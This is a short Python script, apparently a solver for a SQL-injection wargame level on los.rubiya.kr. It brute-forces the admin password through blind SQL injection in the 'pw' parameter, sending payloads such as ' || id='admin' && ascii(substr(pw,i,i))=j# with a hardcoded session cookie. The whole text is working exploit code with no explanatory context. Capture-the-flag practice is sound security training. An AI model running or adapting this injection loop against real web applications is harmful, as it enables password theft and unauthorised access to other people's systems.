import urllib.request
import requests

url='https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
headers = { 'Cookie': 'PHPSESSID=8u0ue0omqon5eb2fqcmr03ev33' }
pw=""

for i in range (1,9):
    for j in range(48, 123):
        if (j == 95):
            continue
        query='?pw=%27%20||%20id=%27admin%27%20%26%26%20ascii(substr(pw,{},{}))={}%23'.format(i,i,j)
        r = requests.get(url + query, headers=headers)
        if r.text.find("<h2>Hello guest</h2>") != -1:
            pw = pw + chr(j)
            print('password is ', pw)
            break